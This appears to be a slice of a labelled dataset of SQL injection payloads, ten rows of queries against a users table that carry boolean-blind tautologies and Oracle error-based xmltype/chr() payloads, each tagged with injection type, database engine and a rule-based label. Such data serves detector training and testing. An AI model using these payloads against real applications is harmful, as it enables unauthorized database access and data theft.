row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
37290,"select * from users WHERE username = ""1\' and username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-2154%\'",1,,boolean_blind,postgresql,0.95,8152 = 8152 or detected — boolean_blind injection (priority 8) on postgresql,rule-based
37291,"select * from users WHERE username = ""-1549\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'fnwx\' = \'fnwx"" and username = ""1\' ) where 1502 = 1502",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
37292,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'ykjs\' like \'ykjs"" or username = ""-5863"" and username = ""1 ) ) and ( ( 5139 = 5139""",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
37293,"select * from users WHERE username = ""1\' ) ) and ( ( \'qtul\' like \'qtul"" or username = ""1\'+ ( select oljg where 2006 = 2006 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"" and ( \'tqjx\' = \'tqjx""",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
37294,"select * from users WHERE username = ""1\' or username = ""1 ) as nbno where 9816 = 9816 and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk""",1,,boolean_blind,generic,0.95,") and (, 9816 = 9816 and detected — boolean_blind injection (priority 8) on generic",rule-based
37295,"select * from users WHERE username = ""-7242\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and \'kfff\' = \'kfff"" and username = ""-1254"" and username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """,1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
37296,"select * from users WHERE username = ""-9987 ) ) ) or# ( ( ( 2114 = 2114"" and username = ""1 ) ) ) and ( ( ( 3505 = 3505""",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
37297,"select * from users WHERE username = ""1\' ) ) ) and username = ""1\' ) ) and ( ( \'hbwk\' like \'hbwk""",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
37298,"select * from users WHERE username = ""-5585\' and username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1 ) ) ) and ( ( ( 6395 = 6395""",1,,boolean_blind,generic,0.95,") and (, 1596 = 1596 or detected — boolean_blind injection (priority 8) on generic",rule-based
37299,"select * from users WHERE username = ""1\' ) ) and username = ""-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""-1254""",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
